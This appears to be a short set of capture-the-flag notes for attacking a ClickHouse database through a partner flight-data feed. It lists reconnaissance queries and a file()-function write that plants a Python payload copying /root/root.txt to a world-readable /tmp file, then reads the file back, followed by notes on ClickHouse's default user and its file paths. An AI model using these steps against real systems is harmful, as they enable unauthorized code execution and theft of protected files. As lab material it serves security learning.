# SQLs
```
SHOW DATABASES

SHOW GRANTS

SHOW TABLES

SHOW CREATE TABLE partner_feed.flightleg_json

SELECT flight_number, airline FROM partner_feed.flightleg_json WHERE flight_number='P1'


# if grante file permission

INSERT INTO FUNCTION file('aidx_quarantine','RawBLOB') SELECT '
import os, shutil 
shutil.copy("/root/root.txt", "/tmp/rflag")
os.chmod("/tmp/rflag", 0o644)'

SELECT * from file('aidx_quarantine.py','RawBLOB')

```

# Notice
1. [TODO]how to prevent XXE
2. clickhouse has a default user
3. ClickHouse file() reads and writes /var/lib/clickhouse/user_files/.